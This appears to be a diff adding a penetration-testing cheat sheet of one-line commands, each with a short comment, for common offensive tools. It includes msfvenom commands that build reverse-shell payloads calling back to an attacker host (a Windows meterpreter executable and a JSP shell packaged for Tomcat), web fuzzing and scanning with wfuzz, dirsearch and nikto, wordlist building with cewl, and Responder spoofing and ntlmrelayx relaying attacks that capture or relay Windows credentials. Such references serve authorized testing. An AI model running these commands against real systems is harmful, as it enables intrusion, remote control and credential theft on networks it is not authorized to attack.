@@ -1,0 +1,32 @@
+# msfvenom generate meterpreter with file format exe for windows
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=<ip> LPORT=<port> -f exe
+
+# msfvenom generate java tcp reverse shell with file format war for tomcat deployment
+msfvenom -p java/jsp_shell_reverse_tcp LHOST=<ip> LPORT=<port> -f war
+
+# wfuzz fuzz a get parameter with; -f out file; --hw hide response with word count; --hh hide response with character count; --hc <code> hide responsecode <code>
+wfuzz --hw <word-count> -f <out-file> -w <wordlist> 'https://target.url?param1=FUZZ&param2=42'
+
+# dirsearch with standard wordlist; -b scan domain not ip; -E all extensions; -F follow redirects
+dirsearch -u https://target.url -b -E -F --plain-text-report <out-file>
+
+# dirsearch with input list and 4 thrads
+dirsearch -L <in-list> -t 4
+
+# nikto with conssole output an html outfile; -Tuning 1234bde Test for 1: Interesting File / Seen in logs 2: Misconfiguration / Default File 3: Information Disclosure 4: Injection (XSS/Script/HTML)  b: Software Identification
+nikto -Display 1234EP -Tuning 1234bde -o <file-name>.html -Format htm -host <target-url>
+
+# cewl generate a password list from a website; -w out file, -d search-dapth 2, -m minimum length 5
+cewl -w <file-name>.txt -d 2 -m 7 <target-url>
+
+# aquatone screenshot all urls in a given file and generate a nice html overview
+cat <urls-in-file> | aquatone -out <out-folder>
+
+# Responder.py analyze mode; Listen for packeges and list them on screen
+Responder.py -I <interface> -A
+
+# Responder.py start spoofing attack
+Responder.py -I <interface>
+
+# ntlmrealyx LDAP/SMB... relaying attack; -tf Tagget file; with -t ldap://<ip>, ldaps://<ip>, smb://<ip> single target
+ntlmrelayx.py -tf <dc-ip.list>
